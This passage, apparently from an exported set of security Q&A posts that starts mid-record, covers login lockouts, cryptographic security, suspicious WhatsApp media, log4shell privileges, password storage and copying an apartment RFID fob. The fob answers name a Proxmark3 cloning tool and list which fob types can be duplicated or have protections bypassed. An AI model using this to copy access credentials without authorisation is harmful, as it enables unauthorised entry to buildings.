<li>triggering 2FA on failed login attempts</li>
</ul>
","2"
"258159","258159","Send password reset email after too many failed logins versus X minutes of lock out","<p>Some sites lock me out for a while after too many failed attempts.</p>
<p>For our own site, we want to force a password reset email after X amount of failed attempts. After all, if your email is compromised, then everything is compromised.</p>
<p>Further advantages: we don't stop the user in their tracks.</p>
<p>Am I missing something?</p>
","0","3","258162","<p>When it comes to the security of this solution, it is slightly better than timeouts because if the attacker has an idea what the password might be, but doesn't get it in X tries, the user will be notified.</p>
<p>But it might make UX way worse. If the user has 1 password for all their applications (often the case) and has to reset it due to a small typo (different keyboard, caps lock on), that would be annoying.</p>
<p>When it comes to the UX of this solution. You need to think about the user type:</p>
<ul>
<li>do they use password managers? -&gt; they can't mistype their password</li>
<li>do they frequently have to log in?</li>
</ul>
<p>Depending on how the app will be used and how often users will log in, the solution should follow, but this is UX.</p>
<p>I'd personally like to choose if I want to reset or wait after X failed attempts (I'd also want to be notified if I decide to reset).</p>
","1"
"258159","258159","Send password reset email after too many failed logins versus X minutes of lock out","<p>Some sites lock me out for a while after too many failed attempts.</p>
<p>For our own site, we want to force a password reset email after X amount of failed attempts. After all, if your email is compromised, then everything is compromised.</p>
<p>Further advantages: we don't stop the user in their tracks.</p>
<p>Am I missing something?</p>
","0","3","258174","<blockquote>
<p>For our own site, we want to force a password reset email after X
amount of failed attempts. After all, if your email is compromised,
then everything is compromised.</p>
</blockquote>
<p>How do you infer that the &quot;email is compromised&quot; ?
A more reasonable approach to brute force attempts is to ban the offending <strong>IP address</strong> for a while, that's what tools such as Fail2ban do. There is no reason to restrict the account of the victim.</p>
<p>If someone is trying to brute-force your account, it shouldn't cause inconvenience to you, like forcing a password reset upon you, <em>which is most likely pointless since the attempt was unsuccessful</em>.</p>
<p>If you were to implement such a &quot;security feature&quot; this could even turn to a form a DDOS against yourself: if a bot is continuously brute-forcing your account and forcing a password reset every time, this could deny you the ability to log in to the site.</p>
<p>On the other hand, being notified of repeated failed attempts is a good thing.</p>
","3"
"258105","258105","What makes a symmetric encryption algorithm cryptographically secure?","<p>I'm trying to learn a bit more about symmetric encryption and found out that basically every symmetric encryption and decryption is (somehow) in the end based on a simple XOR-Byte-Toggle with using a password and some data.</p>
<p>My Question now is, why do we need to make &quot;secure&quot; encryption and decryption algorithms?</p>
<p>I think of it like this:</p>
<p>When I get data, which I happen to know is AES (or with whatever algorithm) encrypted and I now want to read it. You need a password to decrypt it. The only way I see a &quot;security&quot; problem here is, that someone who receives that data besides you, needs the password to decrypt it (also knowing that the data is AES encrypted).</p>
<p>The way he now tries to decrypt the data is: Dictionary-Attacks,... (going all the way up to Bruteforce).</p>
<p>But a computer cannot really define the data to be correctly decrypted as long as the data has no standard header or something how you can identify the correct decryption of it (think of a simple Text-File for example).
With all that in mind, I'm struggling to understand why we not only use a simple XOR-Encryption as it is simple, most likely the fastest way on en- and decrypting files and easy to implement in basically every programming language.</p>
<p>The more or less key-question here is, what exactly means that an en- and decryption-algorithm is cryptographically secure?</p>
","8","3","258106","<p>You are correct that most stream ciphers (and many block ciphers in stream modes) generate a keystream and then XOR the data with it.  For security, there is usually some sort of message authentication code applied, either as part of an AEAD or externally.  There are certainly many other approaches involved, but those are very common.</p>
<p>For most asymmetric algorithms, the typical thing that makes them secure is some sort of hard problem, typically one in NP.  For example, RSA is based on the difficulty of factoring large integers, and Diffie-Hellman is based on the difficulty of computing discrete logarithms.</p>
<p>Sometimes these algorithms have a &quot;trapdoor&quot; of sorts, where a person who knows a secret (the person with the private key) can compute a value efficiently, but for everyone else the problem is computationally infeasible.  Common examples of this approach include most knapsack problems.</p>
<p>In many cases, we cannot prove that the problem is actually hard, we just conjecture that it is.  For example, the actual hard problem in Diffie-Hellman is one of the variants of what is called the Diffie-Hellman problem.  We conjecture that there is no easier way to solve the Diffie-Hellman problem than to solve the Discrete Logarithm Problem, but nobody has proven this for certain.  However, nobody has shown a counterexample, either, so we continue to use these algorithms and believe them to be secure.</p>
","5"
"258105","258105","What makes a symmetric encryption algorithm cryptographically secure?","<p>I'm trying to learn a bit more about symmetric encryption and found out that basically every symmetric encryption and decryption is (somehow) in the end based on a simple XOR-Byte-Toggle with using a password and some data.</p>
<p>My Question now is, why do we need to make &quot;secure&quot; encryption and decryption algorithms?</p>
<p>I think of it like this:</p>
<p>When I get data, which I happen to know is AES (or with whatever algorithm) encrypted and I now want to read it. You need a password to decrypt it. The only way I see a &quot;security&quot; problem here is, that someone who receives that data besides you, needs the password to decrypt it (also knowing that the data is AES encrypted).</p>
<p>The way he now tries to decrypt the data is: Dictionary-Attacks,... (going all the way up to Bruteforce).</p>
<p>But a computer cannot really define the data to be correctly decrypted as long as the data has no standard header or something how you can identify the correct decryption of it (think of a simple Text-File for example).
With all that in mind, I'm struggling to understand why we not only use a simple XOR-Encryption as it is simple, most likely the fastest way on en- and decrypting files and easy to implement in basically every programming language.</p>
<p>The more or less key-question here is, what exactly means that an en- and decryption-algorithm is cryptographically secure?</p>
","8","3","258107","<p>When you design an encryption algorithm, you generally want it to be secure in as many use cases as possible. This would allow you to reuse the same algorithm everywhere, saving <em>a lot</em> of resources and permitting things like hardware acceleration for the industry standard algorithms (like for <a href=""https://en.wikipedia.org/wiki/AES_instruction_set"" rel=""nofollow noreferrer"">AES</a>).</p>
<p>When you want to design an algorithm for as many use cases as possible, you have to defend against a wide variety of attacks, many of which would never even cross the mind of a non-cryptographer. Take, for example, the <a href=""https://en.wikipedia.org/wiki/Known-plaintext_attack"" rel=""nofollow noreferrer"">known plaintext attack</a> model. To a cryptography newbie, it sounds counter-intuitive to defend against a known plaintext model. If the adversary already knows the plaintext, what exactly is there left to protect?</p>
<p>Well, it turns out that in the real world, a lot of the encrypted stuff is actually just known plaintext. Consider what happens when you visit <a href=""https://security.stackexchange.com"">https://security.stackexchange.com</a>. The server and your browser negotiate a symmetric key, and then the server uses that key to encrypt the html for the homepage and sends it to you. Except, the homepage is entirely known plaintext! Anybody can browse to the security.stackexchange.com and receive the plaintext for the homepage. If your algorithm is not known-plaintext attack resistant, an attacker could employ some form of <a href=""https://en.wikipedia.org/wiki/Cryptanalysis"" rel=""nofollow noreferrer"">cryptanalysis</a> to derive the symmetric encryption key that the server and your browser negotiated. Now, when you proceed to log in to your account, the attacker can decrypt the credentials you use to sign in, because they already have the encryption key you are using to communicate with the server. Similarly, most file formats have some sort of header which can be easily guessed, and so are also susceptible to known plaintext attacks.</p>
<p>And cryptanalysis is not limited to known-plaintext attacks, you also have <a href=""https://en.wikipedia.org/wiki/Chosen-plaintext_attack"" rel=""nofollow noreferrer"">chosen plaintext attacks</a>, <a href=""https://en.wikipedia.org/wiki/Chosen-ciphertext_attack"" rel=""nofollow noreferrer"">chosen ciphertext attacks</a>, <a href=""https://en.wikipedia.org/wiki/Padding_oracle_attack"" rel=""nofollow noreferrer"">padding oracle attacks</a>, <a href=""https://en.wikipedia.org/wiki/Related-key_attack"" rel=""nofollow noreferrer"">related key attacks</a>, <a href=""https://en.wikipedia.org/wiki/Frequency_analysis"" rel=""nofollow noreferrer"">frequency analysis attacks</a> and many many more. At this point, only a person who has devoted a significant amount of time to studying cryptography and cryptanalysis would be able to design an algorithm that can protect against all of these. Which is why security folks always repeat the mantra:</p>
<blockquote>
<p><a href=""https://security.meta.stackexchange.com/a/915/235964"">Do not roll your own</a></p>
</blockquote>
<p>So to answer your key question:</p>
<p>An algorithm is considered cryptographically secure if it is resistant to all known attacks. As soon as someone figures out a new way to break the security of the encryption (i.e. allow decryption of some data encrypted by the algorithm that they should not have been able to decrypt), it will cease to be considered cryptographically secure. This effectively means the term cryptographically secure doesn't have a constant definition. What is considered cryptographically secure today, might not be secure twenty years later.</p>
","9"
"258105","258105","What makes a symmetric encryption algorithm cryptographically secure?","<p>I'm trying to learn a bit more about symmetric encryption and found out that basically every symmetric encryption and decryption is (somehow) in the end based on a simple XOR-Byte-Toggle with using a password and some data.</p>
<p>My Question now is, why do we need to make &quot;secure&quot; encryption and decryption algorithms?</p>
<p>I think of it like this:</p>
<p>When I get data, which I happen to know is AES (or with whatever algorithm) encrypted and I now want to read it. You need a password to decrypt it. The only way I see a &quot;security&quot; problem here is, that someone who receives that data besides you, needs the password to decrypt it (also knowing that the data is AES encrypted).</p>
<p>The way he now tries to decrypt the data is: Dictionary-Attacks,... (going all the way up to Bruteforce).</p>
<p>But a computer cannot really define the data to be correctly decrypted as long as the data has no standard header or something how you can identify the correct decryption of it (think of a simple Text-File for example).
With all that in mind, I'm struggling to understand why we not only use a simple XOR-Encryption as it is simple, most likely the fastest way on en- and decrypting files and easy to implement in basically every programming language.</p>
<p>The more or less key-question here is, what exactly means that an en- and decryption-algorithm is cryptographically secure?</p>
","8","3","258117","<blockquote>
<p>I'm trying to learn a bit more about symmetric encryption and found out that basically every symmetric encryption and decryption is (somehow) in the end based on a simple XOR-Byte-Toggle with using a password and some data.</p>
</blockquote>
<p>This is wrong. Let's begin some formal definitions;</p>
<p><strong>A block cipher is a family of permutations</strong> where each key is expected to select a unique premutation from the family. And we want the block cipher to be Pseudo-Random permutation (PRP).</p>
<p><strong>Block ciphers are primitives</strong> and need a proper mode of operation for the target system. We have tons of <a href=""https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation"" rel=""nofollow noreferrer"">mode of operations for block ciphers</a> on which CTR and OFB are common modes to turn any block cipher into a stream cipher. When we define the mode of operation we can talk about</p>
<ul>
<li>KPA: Known Plaintext Attack</li>
<li>CPA: Chosen Plaintext Attack</li>
<li>CCA: Chosen Ciphertext Attack and its variants as CCA1,CCA2,CCA3,</li>
<li>and some other more...</li>
</ul>
<p>We expect a mode that has at least Ind-CPA secure ( Ind -&gt; Indistinguishable) where ECB fails and CTR and CBC can have Ind-CPA security.</p>
<ul>
<li><p><strong>The CTR mode</strong> actually doesn't need the inverse permutation (i.e. the decryption of the block cipher) so we can use any Pseudo-Random Function (PRF) as a wide range set of functions with better security margins. <a href=""https://crypto.stackexchange.com/a/85572/18298"">The CTR mode was originally designed for PRFs</a>.</p>
</li>
<li><p><strong>The CBC mode</strong> was very common, see pre TLS 1.3. CBC mode had the padding oracle attacks that are finally removed from TLS 1.3.</p>
</li>
<li><p><strong>Authenticated mode of operation</strong>: In TLS 1.3 we have only authenticated modes AES-GCM, AES-CCM, and ChaCha20-Poly1305 where each of them internally uses CTR mode (ChaCha is built-in CTR mode ) and they have also authentication with the GCM and Poly1305. There is no padding in CTR mode to be attacked.</p>
</li>
</ul>
<blockquote>
<p>My Question now is, why do we need to make &quot;secure&quot; encryption and decryption algorithms?</p>
</blockquote>
<p>Of course, we need. <strong>We want to secure our information</strong>. For example; If if you insist on using DES with a single key there can be entities that <a href=""https://crypto.stackexchange.com/a/62772/18298"">can break your encryption in a day</a>!. The current secure key size is at least 112 according to NIST.</p>
<p><strong>Use AES with a 256-bit key</strong> to be secure against even the possible Cryptographic Quantum Computers (<strong>QCQ</strong>). You can also use ChaCha20 with a 256-bit key ( or better use XChaCha20 with 192-bit random nonces to mitigate a possible (IV,key) pair reuse problem ).</p>
<blockquote>
<p>When I get data, which I happen to know is AES (or with whatever algorithm) encrypted and I now want to read it. You need a password to decrypt it. The only way I see a &quot;security&quot; problem here is, that someone who receives that data besides you, needs the password to decrypt it (also knowing that the data is AES encrypted).</p>
<p>The way he now tries to decrypt the data is: Dictionary-Attacks,... (going all the way up to Bruteforce).</p>
</blockquote>
<p>Yes, since AES is secure against key searches ( even <a href=""https://crypto.stackexchange.com/q/76738/18298"">AES-128</a> has), the plausible attack is your password. If you use a bad password then the attacker brute-for them starting from the known <a href=""https://haveibeenpwned.com/Passwords"" rel=""nofollow noreferrer"">over 613M pawned passwords</a>. They may try to rainbow tables, too, for all possible combinations like 8 characters.</p>
<p>To mitigate password search attacks you need</p>
<ul>
<li>to use a good password with a good strength like generated from dice-wire, minimum 128-bit strength is recommended.</li>
<li>to use a good Password-Based Key Derivation Function like the latest contest winner Argon2. With the correct parameters, you can reduce the attacker's capabilities. A high number of iterations, memory-hardness, and increased threads are the key to achieving this what Argon2 provides all. Massive GPU, ASIC, and CPU attacks are reduced.</li>
</ul>
<blockquote>
<p>But a computer cannot really define the data to be correctly decrypted as long as the data has no standard header or something how you can identify the correct decryption of it (think of a simple Text-File for example).</p>
</blockquote>
<p>This really depends on the encryption scheme that is used. For example</p>
<ul>
<li><p>CBC mode has PKCS#7 padding that can be tested during the brute-force as the <a href=""https://crypto.stackexchange.com/a/64866/18298"">DES challenger did</a>.</p>
</li>
<li><p>In GCM and ChaCha the authentication tag can be tested to be correct or not.</p>
<p>Note that there are deep details in each like the probability of the padding to be a false-positive and similarly for the GCM and ChaCha. This is not considered here.</p>
</li>
</ul>
<p>If the file is a text file then one can look for the possible strings, too. The more close to natural language the higher candidate to be the true key. All of this can be automated.</p>
<blockquote>
<p>With all that in mind, I'm struggling to understand why we not only use a simple XOR-Encryption as it is simple, most likely the fastest way on en- and decrypting files and easy to implement in basically every programming language.</p>
</blockquote>
<p>It seems that you are talking about One Time Pad (OTP) encryption. The simple reason is this; to be unconditionally secure ( or call it perfect secrecy or information-theoretically secure) <strong>the key size must be equal to the message size</strong>. We know this since 1949 by Claude Shannon. This is impractical for today's most systems.</p>
<p>Today <strong>we relaxed this condition to be computationally secure against polynomially bounded adversaries</strong>. We construct a block cipher or stream cipher that resists known attacks. Then with a stream cipher, we can directly encrypt the messages with x-or. For block ciphers, we need a mode of operation and as mentioned above we select a proper mode of operation for our needs. Different application has different risks and needs a different mode of operations like today we use XTS/XTX mode of operations for disk encryptions instead of CTR mode that was used before and had some attack points.</p>
<p>OTP seems to be easy to implement, however, the key generation and distribution was the common problem. Remember the reuse can cause a crib-Draggin attack and this happened in history,</p>
<blockquote>
<p>The more or less key-question here is, what exactly means that an en- and decryption-algorithm is cryptographically secure?</p>
<p>What makes a symmetric encryption algorithm cryptographically secure?</p>
</blockquote>
<p>The simple answer is years of research and cryptanalysis during the design.</p>
<ul>
<li><p>Block ciphers need</p>
<ul>
<li><p>good <a href=""https://en.wikipedia.org/wiki/Confusion_and_diffusion"" rel=""nofollow noreferrer"">diffusion and confusion</a> properties</p>
</li>
<li><p>Resistance to all known attacks like</p>
<ul>
<li>differential attack and it's variants;
<ul>
<li>truncated differential attack</li>
<li>partial differential attack</li>
<li>boomerang attack</li>
<li>impossible differential cryptanalysis</li>
</ul>
</li>
<li>Linear attacks.</li>
<li>Integral cryptanalysis</li>
<li>Slide attacks,</li>
<li>Algebraic attacks, XL, XLS.</li>
</ul>
</li>
<li><p>needs to be indistinguishable from a random permutation.</p>
</li>
<li><p>enough round with a good round function.</p>
<p>as a necessary condition.</p>
</li>
</ul>
<p>A good block cipher like <a href=""https://crypto.stackexchange.com/q/76738/18298"">AES has resisted attacks</a> for more than 20 years. Even a QCQ is built we expect that AES-256 will be secure in the near future and in the industry is called the golden standard. Use AES-256 instead of AES-128 and you will get at most %40 performance penalty.</p>
</li>
<li><p><a href=""https://en.wikipedia.org/wiki/Stream_cipher"" rel=""nofollow noreferrer"">Stream ciphers</a></p>
<ul>
<li>requires a large period</li>
<li>No related key attack</li>
<li>and Pseudo-Random Sequence are necessary conditions.</li>
</ul>
</li>
</ul>
<p>And remember</p>
<blockquote>
<p>There is an old saying inside the US National Security Agency (NSA): Attacks always get better; they never get worse.**</p>
</blockquote>
<p>Therefore prepare for all possible attack scenarios even failure of the RSA/ECC to CQC and use <a href=""https://csrc.nist.gov/projects/post-quantum-cryptography"" rel=""nofollow noreferrer"">post-quantum public-key cryptosystem</a></p>
","4"
"258034","258034","Unknown numbers sending videos on WhatsApp. What should I do?","<p>A number with ISD code +92 sent a video via WhatsApp. No text, only a video. About 20 days later, another number with same ISD sent another video.</p>
<p><strong>Should I open the video?</strong></p>
<p>OR</p>
<p><strong>Should I Report and Block?</strong></p>
<p>Moreover, a family member received the videos as well but from different numbers but same ISD. Can't say if we have been sent the same videos as the durations (as seen from notifications) are different. That's all I know.</p>
","0","3","258035","<p>If you don't know the sender of the videos, I personally would not open anything. You could theoretically open the videos in an isolated environment where the impact if it is harmful is lower, but I would not open it on any device, in any environment where it could do serious damage. With that said, fight your curiosity! :)</p>
","2"
"258034","258034","Unknown numbers sending videos on WhatsApp. What should I do?","<p>A number with ISD code +92 sent a video via WhatsApp. No text, only a video. About 20 days later, another number with same ISD sent another video.</p>
<p><strong>Should I open the video?</strong></p>
<p>OR</p>
<p><strong>Should I Report and Block?</strong></p>
<p>Moreover, a family member received the videos as well but from different numbers but same ISD. Can't say if we have been sent the same videos as the durations (as seen from notifications) are different. That's all I know.</p>
","0","3","258116","<p>Videos and images have long been used against smartphone users to hack their devices.</p>
<p>The best you could do is to delete the entire conversations and block the numbers.</p>
<p>Make sure your phone is fully updated and don't skimp on OS updates.</p>
","2"
"258034","258034","Unknown numbers sending videos on WhatsApp. What should I do?","<p>A number with ISD code +92 sent a video via WhatsApp. No text, only a video. About 20 days later, another number with same ISD sent another video.</p>
<p><strong>Should I open the video?</strong></p>
<p>OR</p>
<p><strong>Should I Report and Block?</strong></p>
<p>Moreover, a family member received the videos as well but from different numbers but same ISD. Can't say if we have been sent the same videos as the durations (as seen from notifications) are different. That's all I know.</p>
","0","3","264815","<p>The best course of action when receiving messages from unknown numbers is to block and delete. Especially so if they are sending you any kind of media. It is also best to NOT open the media because it could contain malware. Do not respond to the message because it lets them know that your number is active and potentially a good target for further spam.</p>
","2"
"257992","257992","At which OS privilege level log4j usually runs?","<p>Considering that a RCE vulnerability has been recently found in the log4j library, a library used in a lot more applications than I thought. The following question comes to my mind.</p>
<p>If an attacker successfully exploits log4shell, does the payload will run as root or as a regular (less-privileges) user?</p>
<p>In other words, does the payload execution privileges level depends of at which privileges level the service or application that uses log4j runs?</p>
<p>In case of the payload running at regular user, the attacker would need a privilege escalation in addition to log4shell in order to gain root privileges. It would be more difficult to control the entire machine and make more damages (such as disabling system auditing tools to hide other malicious activities, install system-wide keyloggers or any kind of spywares for example).</p>
","6","3","257993","<h1>That depends entirely on your system setup!</h1>
<p>From a technical point of view, the RCE is executed with the same permissions as the <code>java</code> process on the system. This could mean running as root, but more often than not, it means running as a less-privileged user. When I google &quot;debian tomcat&quot;, <a href=""https://www.digitalocean.com/community/tutorials/how-to-install-apache-tomcat-9-on-debian-10"" rel=""noreferrer"">this</a> is the first guide I come across, and it suggests setting up a dedicated user for the tomcat process.</p>
<p>Judging by my personal experience doing penetration tests, this is how you'd <em>expect</em> a server to be set up. As you correctly assessed, this means an attacker would need to find some way to escalate their privileges. On a properly set up system, that should not be possible, but you never know what sysadmins do when the day is long and hours don't want to pass.</p>
","7"
"257992","257992","At which OS privilege level log4j usually runs?","<p>Considering that a RCE vulnerability has been recently found in the log4j library, a library used in a lot more applications than I thought. The following question comes to my mind.</p>
<p>If an attacker successfully exploits log4shell, does the payload will run as root or as a regular (less-privileges) user?</p>
<p>In other words, does the payload execution privileges level depends of at which privileges level the service or application that uses log4j runs?</p>
<p>In case of the payload running at regular user, the attacker would need a privilege escalation in addition to log4shell in order to gain root privileges. It would be more difficult to control the entire machine and make more damages (such as disabling system auditing tools to hide other malicious activities, install system-wide keyloggers or any kind of spywares for example).</p>
","6","3","258032","<p>I have posted a <a href=""https://security.stackexchange.com/questions/258023/clarification-on-log4j-service-requirements"">related question</a> in order to obtain reputable and authoritative answers.</p>
<p>Here is my answer:</p>
<p>1.) CVE-2021-44228 involves injecting a malformed string to a Java application that employs specific versions of the log4j library. If properly constructed, this string can instantiate the library's lookup feature to query a malicious LDAP server, which through a properly formatted response, can execute commands on the vulnerable application's host.</p>
<p>2.) While there may be additional vulnerabilities that could be exploited through said remote code execution on the target host, there is no indication that this exploit intrinsically performs privilege escalation methods.</p>
<p>3.) The execution context of a typical Java based web application likely has some elevated privileges, including write access to application or service configuration files, as well as the ability to launch\stop\start published services. In this case, I agree with the high severity level.</p>
<p>4.) A different scenario involves the instantiation an arbitrary Java stack by a non-privileged user.  The typical execution context here would be much more constrained in terms of systemic impact.  For example, where a standard user level account only has access to user-land capabilities and is much more limited in terms of write access to system files.  Additionally, it would be somewhat atypical for user-instantiated applications to be remotely accessible.</p>
<p>5.) If my assertions are correct, the severity of CVE-2021-44228 is significantly reduced for Java applications running within an unprivileged execution context.</p>
<p>6.) The lack of authoritative clarification from the main stakeholders on the difference between these common use cases in terms of severity is troubling. I would like to get confirmation of my assertions from an authoritative, reputable source.</p>
","1"
"257992","257992","At which OS privilege level log4j usually runs?","<p>Considering that a RCE vulnerability has been recently found in the log4j library, a library used in a lot more applications than I thought. The following question comes to my mind.</p>
<p>If an attacker successfully exploits log4shell, does the payload will run as root or as a regular (less-privileges) user?</p>
<p>In other words, does the payload execution privileges level depends of at which privileges level the service or application that uses log4j runs?</p>
<p>In case of the payload running at regular user, the attacker would need a privilege escalation in addition to log4shell in order to gain root privileges. It would be more difficult to control the entire machine and make more damages (such as disabling system auditing tools to hide other malicious activities, install system-wide keyloggers or any kind of spywares for example).</p>
","6","3","258078","<p><strong>Root privileges are a red herring and fairly irrelevant in a typical modern server setup.</strong></p>
<p>As-is, the log4shell RCE exploit effectively gives the attacker all information the Java server process can access.</p>
<p>With this, the attacker typically gets:</p>
<ul>
<li>Read and write access to the application's database.</li>
<li>various API keys and passwords to other systems.</li>
<li>probably all active users' credentials (which may be reused elsewhere or outright be identical to more critical systems via a central identity management like (sic!) LDAP).</li>
<li>and of course they can start processes, like a botnet client, cryptominer or spam engine.</li>
</ul>
<p>And that's basically already the crown jewels - the server is usually a VM or container with nothing else running on it and nobody ever logging into it directly. Who cares about getting root there? Root privileges are an <em>intermediate</em> step towards business goals, not a goal in and of themselves.</p>
<p>And even if you really care about root privileges: privilege escalation vulnerabilities are pretty common - and often discounted since &quot;it's a server, we don't have untrusted OS users&quot;.</p>
","2"
"257985","257985","Password manager vs Gmail","<p>Is there any security issue if I use for example my Gmail account to store passwords from another resources instead of using any password manager like a KeePass?</p>
<p>If my password for Gmail account is not duplicated on any other resources, it is strong enough and I have 2FA what is the reason to use password manager? Question is only about security. Let's omit user experience, etc.</p>
","1","3","257999","<p>Simply put, using the Google password manager is definitely better than using nothing at all. However, it's really a matter of convenience, browsers were not built to be password managers, it consists of a feature to simplify the user experience.</p>
<p>The security aspect will be strictly limited to the security of your devices that you use to access Google's ecosystem (anybody that has access to the account will be able to consult the vault).</p>
<p>In other words, the native password manager itself is most likely secured, but some simply prefer to not store and aggregate all of their sensitive information in a placeholder built by selling data. I am not stating that they will use the data regarding the stored passwords, but I still think it is better to avoid this by using a third party tool dedicated to storing passwords separately.</p>
","0"
"257985","257985","Password manager vs Gmail","<p>Is there any security issue if I use for example my Gmail account to store passwords from another resources instead of using any password manager like a KeePass?</p>
<p>If my password for Gmail account is not duplicated on any other resources, it is strong enough and I have 2FA what is the reason to use password manager? Question is only about security. Let's omit user experience, etc.</p>
","1","3","258794","<p>I know that Google is a serious company, and I would assume that they use good security practices. Nevertheless, storing your passwords on Gmail means that they are accessible to Google, which includes Google admin staff and US governmental agencies because of the Patriot Act.</p>
<p>Being a non US citizen, I would never store my professional account passwords there, or would be blamed by my security team if I did.</p>
<p>On as strict individual point of view I admit that the risk is low, except if you are an international gangster, or a VIP for governmental agencies to spy at you. But do you really thing that a fired employee could not leak private data from their company as a revenge?</p>
<p>Compared to a local password manager or at least a locally encrypted one, using Gmail can only augment the attack surface: if your local system is compromised, chances are that you Gmail account will be too. But you have just make your passwords vulnerable to an attack targetting Google data...</p>
<p>That being said, and IMHO, storing passwords in Gmail is still better than consistently use the same password for every account or storing them in an unencrypted file.</p>
","1"
"257985","257985","Password manager vs Gmail","<p>Is there any security issue if I use for example my Gmail account to store passwords from another resources instead of using any password manager like a KeePass?</p>
<p>If my password for Gmail account is not duplicated on any other resources, it is strong enough and I have 2FA what is the reason to use password manager? Question is only about security. Let's omit user experience, etc.</p>
","1","3","258808","<p>Does not sound like a good idea to me.</p>
<p>Benefits of using a cloud-like solution:</p>
<ul>
<li>your passwords are synchronized and backed up automatically.</li>
</ul>
<p>Drawbacks:</p>
<ul>
<li>you need Internet access whereas Keepass works offline</li>
<li>exposing your passwords to hostile actors including authorities that can subpoena for the data</li>
</ul>
<p>In case you are subject to an legal investigation in your home country, Google may have to surrender all data they have about you, including your E-mails, searches, location data etc. They already have too much information about you.</p>
<p>I can see a couple reasons for <em>not</em> using Google, but the biggest problem is that you don't &quot;own&quot; the Gmail account. It is a single point of failure. If you lose access to that account, then you lose access to your passwords. That can cause severe inconvenience.</p>
<p>You could be locked out of your account for several reasons, including misunderstandings.</p>
<ul>
<li>Example #1: suppose that people are complaining about <strong>spam</strong> allegedly sent by you, and your account is restricted/closed as a result. Guilty until proven innocent.</li>
<li>Example #2: your account has been <strong>hacked</strong> and Google are making it difficult for you to prove your identity, keep asking supporting documents etc</li>
</ul>
<p>You might be able to regain access to your account after perseverance, or maybe not. Remember, you don't own it. In fact, if you are using a free service they have even fewer obligations toward you. This is more a favor than a right (time to check the TOS again).</p>
<p><em>So now the question is, can you get round this problem ?</em></p>
<p>If you don't know your password, most websites have a reset feature whereby a link is sent to your E-mail address (more rarely, by SMS). <strong>But if the E-mail account on file is the gmail account, then you are still stuck.</strong> Only manual intervention by a human being can reinstate access to the website, and you'll have to repeat this with other parties.</p>
<p>Now you see how centralization can be a problem.</p>
","1"
"257953","257953","Tricky apartment key fob copies frequency & code correctly but the copy doesn't work - not a rolling fob","<p><a href=""https://i.stack.imgur.com/9JXh6.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/9JXh6.jpg"" alt=""tricky apartment key fob"" /></a></p>
<p>I have this key fob for our apartment building, and I want to make a copy of it.</p>
<p>I've taken it to 3 locksmiths who are able to create a copy, but the copies don't work.</p>
<p>I've confirmed that it doesn't appear to be a rolling fob by comparing the frequency and code of the original and the copy after using the original again at the building.</p>
<p>What other security measures could be in place? And how would I be able to copy it?</p>
<p>Does anyone recognize this particular product or know how I can copy it?</p>
","1","3","258910","<p>There just isn't enough information here for the likes of me to state anything with certainty.</p>
<p>Mifare Classic 1k has a unique ID number and several data sectors which are encoded with keys. A basic duplicator/cloning device might copy the unique ID but not reproduce the data sectors properly without first cracking the associated keys. This is one of many possible explanations for what went wrong with your locksmith duplicate.</p>
<p>Another possibility is the IDTK format which is popular at apartment buildings. This format loops through the bitstream and some duplicators may arbitrarily duplicate bits without the right start/length. The result could be a sequence on the clone which is disjointed when it wraps around.</p>
<p>Unlikely, but maybe this is a dual-frequency fob. If only one format is cloned, the reader could be expecting the other, or even both formats. There are so many more possibilities, I'll stop guessing here.</p>
<p>The most powerful and widely supported tool for identifying, emulating and duplicating RFIDs is the Proxmark 3. Knock-off variants of the &quot;Proxmark3 Easy&quot; can be purchased for less than $40 on sites like AliExpress.</p>
<p>The one thing I am confident of is that your photo is of a passive token. This means RFID/NFC, not an active RF remote that can be sniffed with average SDR. Whatever tools you use will need to be sensitive to <a href=""https://en.wikipedia.org/wiki/Near_and_far_field"" rel=""nofollow noreferrer"">near-field</a> electromagnetic energy.</p>
","1"
"257953","257953","Tricky apartment key fob copies frequency & code correctly but the copy doesn't work - not a rolling fob","<p><a href=""https://i.stack.imgur.com/9JXh6.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/9JXh6.jpg"" alt=""tricky apartment key fob"" /></a></p>
<p>I have this key fob for our apartment building, and I want to make a copy of it.</p>
<p>I've taken it to 3 locksmiths who are able to create a copy, but the copies don't work.</p>
<p>I've confirmed that it doesn't appear to be a rolling fob by comparing the frequency and code of the original and the copy after using the original again at the building.</p>
<p>What other security measures could be in place? And how would I be able to copy it?</p>
<p>Does anyone recognize this particular product or know how I can copy it?</p>
","1","3","267549","<p>This looks like a dual-chip generic key fob that can emulate many common formats. Typically it has both a 13.56Mhz and a 125Khz chip installed.</p>
<p>Traditional locksmiths are a bit behind the time on copying RFID based access control keys. Especially the newer formats that are coming out.</p>
","-7"
"257953","257953","Tricky apartment key fob copies frequency & code correctly but the copy doesn't work - not a rolling fob","<p><a href=""https://i.stack.imgur.com/9JXh6.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/9JXh6.jpg"" alt=""tricky apartment key fob"" /></a></p>
<p>I have this key fob for our apartment building, and I want to make a copy of it.</p>
<p>I've taken it to 3 locksmiths who are able to create a copy, but the copies don't work.</p>
<p>I've confirmed that it doesn't appear to be a rolling fob by comparing the frequency and code of the original and the copy after using the original again at the building.</p>
<p>What other security measures could be in place? And how would I be able to copy it?</p>
<p>Does anyone recognize this particular product or know how I can copy it?</p>
","1","3","269407","<p>Look for a Fob Copy place in your area. The reputable ones will tell you right away if it's possible.</p>
<p>I have duplicated many condo fobs and keys that I have learned a bit about them.</p>
<ul>
<li>Low-frequency fobs, from what I am told, are easy to duplicate.</li>
<li>High-frequency fobs range quite a bit.</li>
<li>Desfire fobs can not be done at this time.</li>
<li>Mifare Classics can all be duplicated if they have 4byte UID or 7byte UID, their magic is in the blank, some systems can write back to the card or use some sort of rolling code. If the correct blank is used, some Chinese firewall blanks you can bypass these systems.</li>
<li>Hid iclass SE cannot all can be duplicated, it is based on the configuration of the readers</li>
</ul>
<p>There are many types of formats out there.</p>
","1"
"257950","257950","How could someone's account that is secured by MFA Yubikey be compromised?","<p>Let's say that I purchased a MFA Yubikey device to secure my accounts. If an attacker wanted to compromise my accounts that are secured with this YubiKey, would this be possible without having the actual device?</p>
<p>First let's assume the attacker has had no physical access to the device but has been able to compromise other devices that the user uses (PC, Phone, Tablet etc.).  Second, the attacker was able to gain physical access to said device for an unknown amount of time.</p>
